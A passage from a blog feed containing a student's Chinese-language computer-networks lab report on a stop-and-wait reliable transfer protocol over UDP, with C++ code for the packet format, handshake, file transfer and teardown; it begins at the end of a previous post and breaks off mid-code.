aria-hidden="true">image-20221210211627874</figcaption></figure><p>因此尝试略微调大超时时间（3*MAX_TIME）可以看到正常的接收发送过程。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210502268709_563_20221210213552672768_860_image-20221210211424408.png" alt="image-20221210211424408"><figcaption aria-hidden="true">image-20221210211424408</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210503315103_408_20221210213554281337_662_image-20221210211449133.png" alt="image-20221210211449133"><figcaption aria-hidden="true">image-20221210211449133</figcaption></figure><p>发送成功！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210504699432_552_20221210213555912889_771_image-20221210212403935.png" alt="image-20221210212403935"><figcaption aria-hidden="true">image-20221210212403935</figcaption></figure><p>GitHub:</p><p>https://github.com/Lunaticsky-tql/rdt_on_udp</p><p>GBN对应lab3.2分支，SR对应lab3.2-SR分支。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.1-基于UDP服务设计可靠传输协议</title>
    <link href="/posts/24837/"/>
    <url>/posts/24837/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.1-基于udp服务设计可靠传输协议停等版本">计算机网络实验3.1-基于UDP服务设计可靠传输协议(停等版本)</h1><h2 id="实验要求">实验要求</h2><p>利用数据报套接字在用户空间实现面向连接的可靠数据传输，功能包括：建立连接、差错检测、确认重传等。流量控制采用停等机制，完成给定测试文件的传输。</p><h2 id="程序流程展示">程序流程展示</h2><h3 id="协议设计">协议设计</h3><p>在本次实验中采用基于rdt3.0的协议设计。</p><h4 id="报文结构">报文结构</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210903686515_997_20221119192011936961_320_image-20221119150328876.png" alt="image-20221119150328876"><figcaption aria-hidden="true">image-20221119150328876</figcaption></figure><p>如图所示，报文头长度共<code>128Bits</code>。下面介绍报文结构设计的思路。</p><p>首先，注意到我们的实验只需要从客户端到服务器单向传输数据，因此我们事实上整个实验只需要一个序列号字段即可满足需求。对于发送端对应<code>TCP</code>中的<code>seq</code>,接收端对应<code>TCP</code>中的<code>ack</code>。</p><p>下面是十六位校验和以及数据报字段长度，与<code>TCP</code>相同。</p><p>目前使用<code>u_short</code>来存放<code>flag</code>。其字段含义如下：</p><p><code>F</code>:<code>FIN</code></p><p><code>S</code>:<code>SYN</code></p><p><code>A</code>:<code>ACK</code></p><p><code>H</code>:<code>FILE_HEAD</code></p><p><code>FILE_HEAD</code>用于指示接收端此报文包含文件信息的字段。</p><p><code>window_size</code>本次实验还没有用到。</p><p><code>option</code>为可选字段，在本次实验中暂时用于存放文件名。</p><p><code>data</code>的最大长度可以调节，本次实验定义为1024字节。</p><p>此部分定义代码段如下;</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3qpgfalluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-3qpgfalluwpkzv"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 1024</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA 0x0</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIN 0x1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYN 0x2</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK 0x4</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_SYN 0x6</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_FIN 0x5</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_HEAD 0x8</span><span class="hljs-comment">// datagram format:</span><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack(1)</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet_head</span> {    u_int seq;    u_short check_sum;    u_short data_size;    u_short flag;    u_short window_size;    u_int option;    <span class="hljs-built_in">packet_head</span>() {        seq = <span class="hljs-number">0</span>;        check_sum = <span class="hljs-number">0</span>;        data_size = <span class="hljs-number">0</span>;        flag = <span class="hljs-number">0</span>;        window_size = <span class="hljs-number">0</span>;        option = <span class="hljs-number">0</span>;    }};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet</span> {    packet_head head;    <span class="hljs-type">char</span> data[MAX_SIZE]{};    <span class="hljs-built_in">packet</span>() {        <span class="hljs-built_in">packet_head</span>();        <span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0</span>, MAX_SIZE);    }};<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack()</span></code></pre></div></div><p><code>#pragma pack(1)</code>用于指示结构体内容按1Byte对齐，以保证报文大小是我们期望的紧凑形式。</p><h4 id="建连和断连">建连和断连</h4><p>依然是注意到单向传输的特点，对握手和挥手的过程也进行了优化：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210905183149_434_20221119192018406166_865_image-20221119154308774.png" alt="image-20221119154308774"><figcaption aria-hidden="true">image-20221119154308774</figcaption></figure><p>左边是TCP三次握手的过程，右侧是我为本次实验设计的握手过程。</p><p>TCP第三次握手的目的是“server”需要知道“client”能够收到他的应答。这在server向client发送数据时是有必要的，而本次实验只要发送端知道接收端能发能收，就可以放心的向其发送文件，握手成功。</p><p>接收端在收到发送端的握手信息后就可以准备好接受文件了。此时接收端预料的应当是发送端发送文件信息。但是这时候如果发送端断线了，接收端显然不能干等着，否则在真实情景下完全可以发起类似SYN洪泛攻击的行为。因此我们需要设置定时器，如果在这段时间发送端没有任何信息发来，这时应当释放资源并退出。在此次实验中这个最大时间设置的是1min。</p><p>同时，虽然此次实验假设接收端向发送端发送数据丢包率为0，但是在实验中仍旧考虑了这种情况：如果接收端的ACK丢了，会发生什么情况？因此在接收端准备接受文件时，仍旧检查收到的是否是握手信息。如果是握手信息，那么重置上述提到的定时器，仍旧停留在等待文件信息的状态。</p><p>断连的过程和上述分析类似，也是只需要两次即可。</p><p>另外，不需要文件结束位的原因是因为接受者在得到文件信息的时候就知道文件大小，从而知道有几个数据包，什么时候结束。</p><h3 id="流程设计">流程设计</h3><p>程序支持一次建连发送多个文件。</p><h4 id="服务器">服务器</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210906609864_859_20221119192021770008_725_image-20221119162017409.png" alt="image-20221119162017409"><figcaption aria-hidden="true">image-20221119162017409</figcaption></figure><h4 id="客户端">客户端</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210911470073_495_20221119192117915929_703_image-20221119162044532.png" alt="image-20221119162044532"><figcaption aria-hidden="true">image-20221119162044532</figcaption></figure><p>发送文件数据时遵循rdt3.0的整个过程，也即，在这次实验中序列号暂时只用到0和1。</p><h2 id="程序代码解释">程序代码解释</h2><h3 id="文件发送过程">文件发送过程</h3><h5 id="发送端">发送端</h5><p>首先对照发送端的状态机进行分析： <img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210913988941_208_20221119192126693722_492_image-20221119162927049.png" alt="image-20221119162927049">程序中的函数名与状态机中名称基本一致，思路也非常清晰。主要的变动为把<code>waitACK0</code>和<code>waitACK1</code>合并到了函数中，而不是作为单独的状态出现。这样做的原因是由于握手和挥手阶段的等待过程和文件传输过程中完全一致，通过相同发代码能够将过程统一起来。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-b852vklluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-b852vklluwpkzv"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(pkt_no&lt;pkt_total){    pkt_data_size=<span class="hljs-built_in">min</span>(MAX_SIZE,file_len-pkt_no*MAX_SIZE);    <span class="hljs-keyword">switch</span>(stage)    {        <span class="hljs-keyword">case</span> SEND0:        {            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(DATA, <span class="hljs-number">0</span>, pkt_data_size, file_data + pkt_no * MAX_SIZE);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wait_ACK0</span>(sndpkt)) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed when sending packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no), ERR);                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;            }            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no)+<span class="hljs-string">" with seq 0"</span>, DEBUG);            pkt_no++;            stage = SEND1;            <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">case</span> SEND1:        {            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(DATA, <span class="hljs-number">1</span>, pkt_data_size, file_data + pkt_no * MAX_SIZE);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wait_ACK1</span>(sndpkt)) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed when sending packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no), ERR);                <span class="hljs-keyword">break</span>;            }            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no)+<span class="hljs-string">" with seq 1"</span>, DEBUG);            pkt_no++;            stage=SEND0;            <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">default</span>:            <span class="hljs-keyword">break</span>;    }}</code></pre></div></div><p>下面是<code>waitACK</code>相关函数的实现，以<code>waitACK0</code>为例：</p><p>首先由于需要处理超时事件，发送端和接收端所有的·<code>socket</code>都是非阻塞状态的。对于发送端<code>while</code>条件中的<code>rdt_rcv</code>是非阻塞的，以便在循环内判断超时进行消息重发。当没有收到消息时返回0，收到消息时返回1。循环内的重发若超过一定次数（<code>MAX_RESEND_TIMES</code>,其值为10），便可认为接收端由于意外断连，不再向其发送消息，程序退出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g7n6rblluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-g7n6rblluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">wait_ACK0</span><span class="hljs-params">(packet sndpkt)</span> </span>{    <span class="hljs-type">int</span> resend_times = <span class="hljs-number">0</span>;    <span class="hljs-comment">//start a timer</span>    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();    packet rcvpkt;    <span class="hljs-comment">//non-blocking receive here</span>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">rdt_rcv</span>(rcvpkt) || <span class="hljs-built_in">isACK</span>(rcvpkt, <span class="hljs-number">1</span>)||<span class="hljs-built_in">corrupt</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">timeout</span>(start)) {            <span class="hljs-built_in">udt_send</span>(sndpkt);            start = <span class="hljs-built_in">clock</span>();            <span class="hljs-keyword">if</span> (resend_times &gt; MAX_RESEND_TIMES) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Resend times exceed the limit, there must be something wrong with the network"</span>, ERR);                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Resend packet with seq 0"</span>, WARNING);                resend_times++;            }        }        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isACK</span>(rcvpkt, <span class="hljs-number">1</span>)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received ACK1, discard it"</span>, DEBUG);        }    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}</code></pre></div></div><p><code>rdt_rcv(rcvpkt)</code>实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zwgpzglluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-zwgpzglluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">rdt_rcv</span><span class="hljs-params">(packet &amp;packet1)</span> </span>{    <span class="hljs-type">int</span> len = <span class="hljs-built_in">sizeof</span>(addr_server);    <span class="hljs-type">int</span> ret = <span class="hljs-built_in">recvfrom</span>(socket_sender, (<span class="hljs-type">char</span> *) &amp;packet1, PACKET_SIZE, <span class="hljs-number">0</span>, (SOCKADDR *) &amp;addr_server, &amp;len);    <span class="hljs-keyword">if</span> (ret == SOCKET_ERROR) {        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }    <span class="hljs-keyword">return</span> ret != <span class="hljs-number">0</span>;}</code></pre></div></div><h5 id="接收端">接收端</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210920305113_241_20221119192129767531_984_image-20221119163135874.png" alt="image-20221119163135874"><figcaption aria-hidden="true">image-20221119163135874</figcaption></figure><p>与发送端有所不同，这里的<code>rdt_rcv(rcvpkt)</code>是阻塞的，内含一个非阻塞的<code>recvfrom</code>进行循环接收。若超时（一分钟）仍未收到消息，认为发送端可能意外退出，跳出接收循环，并随后判断文件是否完整接收，以作退出之前的保存和清理工作。这样设计的原因也是在握手和挥手时不依赖其他条件的需要同样的操作，能够较好的统一起来。</p><p>其他部分与状态机中一致。在循环内部需要判断接收到的文件是否已经完全接受，若接受完毕保存文件并退出，准备继续接受下一个文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w7w5bwlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-w7w5bwlluwpkzv"><pre><code class="hljs c++"><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">has_seq0</span>(rcvpkt)) {            <span class="hljs-keyword">if</span> (stage == WAIT0) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_no) + <span class="hljs-string">", with seq 0"</span>, DEBUG);                pkt_data_size = rcvpkt.head.data_size;                <span class="hljs-built_in">memcpy</span>(file_buffer + received_file_len, rcvpkt.data, pkt_data_size);                received_file_len += pkt_data_size;                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, <span class="hljs-number">0</span>);                <span class="hljs-built_in">udt_send</span>(sndpkt);                pkt_no++;                stage = WAIT1;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a packet with seq 0, but we are waiting for seq 1"</span>, WARNING);                <span class="hljs-keyword">continue</span>;            }        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">has_seq1</span>(rcvpkt)) {            <span class="hljs-keyword">if</span> (stage == WAIT1) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_no) + <span class="hljs-string">", with seq 1"</span>, DEBUG);                pkt_data_size = rcvpkt.head.data_size;                <span class="hljs-built_in">memcpy</span>(file_buffer + received_file_len, rcvpkt.data, pkt_data_size);                received_file_len += pkt_data_size;                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, <span class="hljs-number">1</span>);                <span class="hljs-built_in">udt_send</span>(sndpkt);                pkt_no++;                stage = WAIT0;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a packet with seq 1, but we are waiting for seq 0"</span>, WARNING);                <span class="hljs-keyword">continue</span>;            }        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a corrupt packet"</span>, DEBUG);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-keyword">if</span> (received_file_len == file_size) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received file successfully"</span>, SUC);        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Time used: "</span> + <span class="hljs-built_in">to_string</span>(<span class="hljs-built_in">clock</span>() - single_file_start) + <span class="hljs-string">"ms"</span>, INFO);        <span class="hljs-comment">//write the file to disk</span>        string file_path = <span class="hljs-built_in">get_file_path</span>(file_name);        <span class="hljs-function">ofstream <span class="hljs-title">file</span><span class="hljs-params">(file_path, ios::binary)</span></span>;        <span class="hljs-keyword">if</span> (file.<span class="hljs-built_in">is_open</span>()) {            file.<span class="hljs-built_in">write</span>(file_buffer, file_size);            file.<span class="hljs-built_in">close</span>();            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File saved to "</span> + file_path, SUC);            new_file_received = <span class="hljs-literal">true</span>;        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed to open file "</span> + file_path, ERR);        }        <span class="hljs-keyword">break</span>;    }}</code></pre></div></div><p><code>rdt_rcv(rcvpkt)</code>的实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zxu2m5lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-zxu2m5lluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">rdt_rcv</span><span class="hljs-params">(packet &amp;packet1)</span> </span>{    <span class="hljs-type">clock_t</span> wait_file_start = <span class="hljs-built_in">clock</span>();    <span class="hljs-comment">//non-blocking receive here</span>    <span class="hljs-type">int</span> ret = <span class="hljs-built_in">recvfrom</span>(socket_receiver, (<span class="hljs-type">char</span> *) &amp;packet1, PACKET_SIZE, <span class="hljs-number">0</span>, (SOCKADDR *) &amp;addr_server, &amp;addr_len);    <span class="hljs-keyword">while</span> (ret == SOCKET_ERROR || ret == <span class="hljs-number">0</span>) {        <span class="hljs-comment">//no packet received</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">wait_file_timeout</span>(wait_file_start)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout, no packet received"</span>, ERR);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        }        ret = <span class="hljs-built_in">recvfrom</span>(socket_receiver, (<span class="hljs-type">char</span> *) &amp;packet1, PACKET_SIZE, <span class="hljs-number">0</span>, (SOCKADDR *) &amp;addr_server, &amp;addr_len);    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}</code></pre></div></div><h3 id="握手和挥手过程">握手和挥手过程</h3><p>有了文件传输过程的分析，握手和挥手便很容易理解，因为实际上只是文件传输的特例。当然，由于握手和挥手的代码在传输之前完成，因此在编写代码时这一部分设计比较困难，后面完成传输过程时又对其进行了一些优化。</p><p>相比传输过程，握手和挥手主要是需要处理流程上的细节。</p><h4 id="握手">握手</h4><h5 id="发送端-1">发送端</h5><p>发送端握手很简单:把包发过去，等ACK，等不到就重发，重发多了就退出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-txpphilluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-txpphilluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">handshake</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">//as the transmitting is single-direction, so we only need to "shake" two times</span>    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(SYN);    <span class="hljs-built_in">udt_send</span>(sndpkt);    <span class="hljs-keyword">return</span> <span class="hljs-built_in">wait_SYN_ACK</span>();}</code></pre></div></div><h5 id="接收端-1">接收端</h5><p>接收端思路也很明确：“阻塞”等待发送端的握手信息（一分钟内等不到就退出），如果接收到就握手成功，收到错误的包（比如校验和错误）丢弃。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cft8gwlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-cft8gwlluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">handshake</span><span class="hljs-params">()</span> </span>{    packet rcvpkt;    <span class="hljs-type">int</span> wrong_times = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Waiting for handshake"</span>, INFO);        <span class="hljs-comment">//blocking receive here</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isSYN</span>(rcvpkt) &amp;&amp; <span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK_SYN);                <span class="hljs-built_in">udt_send</span>(sndpkt);                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received wrong packet"</span>, ERR);                <span class="hljs-comment">//discard the packet and continue to wait</span>                <span class="hljs-keyword">if</span> (wrong_times &gt; MAX_WRONG_TIMES) {                    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Wrong times exceed the limit, there must be something wrong with the network"</span>, ERR);                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;                } <span class="hljs-keyword">else</span> {                    wrong_times++;                    <span class="hljs-keyword">continue</span>;                }            }        }        <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//timeout</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        }    }}</code></pre></div></div><h4 id="挥手">挥手</h4><p>由上面的流程图所示，挥手过程仅应当发生在文件传输的间隔中。每次等待用户传送新文件时，用户有两种选择：传或不传。若传则发送文件信息，不传发送挥手信息。不管如何，这时接收端一定处在等待接收文件信息的阶段。</p><h5 id="发送端-2">发送端</h5><p>用户没有给出文件名或者选择放弃传送，仅以第一种调用情况为例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3jydyalluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-3jydyalluwpkzv"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (file_path.<span class="hljs-built_in">empty</span>()) {    <span class="hljs-comment">//close the connection</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bye_bye</span>();}</code></pre></div></div><p>挥手成功退出程序，流程结束。 </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yu40iglluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-yu40iglluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bye_bye</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">//send FIN</span>    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(FIN);    <span class="hljs-built_in">udt_send</span>(sndpkt);    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wait_FIN_ACK</span>()) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed to receive FIN ACK"</span>, ERR);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-keyword">else</span>    {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Connection closed elegantly, Task finished!"</span>, SUC);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }}</code></pre></div></div><p></p><h5 id="接收端-2">接收端</h5><p>首先需要介绍接收端等待文件信息的逻辑。如一开始的流程图所示，这发生在握手刚完成或文件传输间隙。如果此时无响应，说明发送端异常退出，接收端也应当退出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gji0zclluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-gji0zclluwpkzv"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ready_for_file</span>(file_name, file_size)) {    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Exit because of no response"</span>,INFO);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>ready_for_file</code>的设计：</p><p>首先为了方便状态机设计，约定传送文件信息的报文序列是1。成功收到消息返回ACK。若收到握手消息，通过递归调用达到重置计时的作用。</p><p>在此过程中若发送方发送挥手消息，给予回应并退出程序，流程结束。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vq36atlluwpkzv"></i><span>C++</span><div class="collapse show" id="collapse-vq36atlluwpkzv"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">ready_for_file</span><span class="hljs-params">(string &amp;file_name, <span class="hljs-type">int</span> &amp;file_size)</span> </span>{    packet rcvpkt;    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Waiting for file info"</span>, INFO);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">has_seq1</span>(rcvpkt)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File name: "</span> + <span class="hljs-built_in">string</span>(rcvpkt.data), DEBUG);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File size: "</span> + <span class="hljs-built_in">to_string</span>(rcvpkt.head.option), DEBUG);            file_name = <span class="hljs-built_in">string</span>(rcvpkt.data);            file_size = rcvpkt.head.option;            string file_path = <span class="hljs-built_in">get_file_path</span>(file_name);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File will be saved to "</span> + file_path, DEBUG);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Ready to receive files"</span>, SUC);            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, <span class="hljs-number">1</span>);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isSYN</span>(rcvpkt)) {            <span class="hljs-comment">//if the ack is lost, the sender will resend the SYN packet</span>            <span class="hljs-built_in">print_message</span>(<span 